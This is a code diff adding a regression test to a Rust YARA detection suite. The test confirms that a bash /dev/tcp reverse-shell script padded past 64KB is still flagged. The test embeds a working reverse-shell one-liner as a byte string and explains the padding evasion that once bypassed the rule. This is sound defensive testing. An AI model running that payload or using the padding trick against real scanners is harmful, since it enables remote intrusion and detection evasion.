@@ -87,4 +87,21 @@ mod tests {
         fake_binary.resize(70 * 1024, 0xAA);
         assert!(!matched_rule_names(&rules, &fake_binary).contains(&"Bash_Dev_Tcp_Reverse_Shell".to_string()));
     }
+
+    /// Regression test for a real bypass found in a follow-up review: the
+    /// original rule gated the whole file on `filesize < 65536`, so an
+    /// attacker could leave a genuine, working reverse-shell payload right
+    /// at the top of the script and just pad the file past 64KB with
+    /// trailing junk to make YARA skip scanning it entirely. The fix
+    /// bounds where the matched strings must occur (still within the
+    /// first 64KB) instead of exempting the whole file past a size
+    /// threshold, so this padded-but-still-malicious script must still
+    /// be flagged.
+    #[test]
+    fn still_flags_a_genuine_reverse_shell_padded_past_the_old_filesize_cutoff() {
+        let rules = compile(None).unwrap();
+        let mut script = b"#!/bin/bash\nexec 3<>/dev/tcp/10.0.0.1/4444\ncat <&3 | while read line; do $line 2>&3 >&3; done\n# ".to_vec();
+        script.resize(70 * 1024, b'A');
+        assert!(matched_rule_names(&rules, &script).contains(&"Bash_Dev_Tcp_Reverse_Shell".to_string()));
+    }
 }
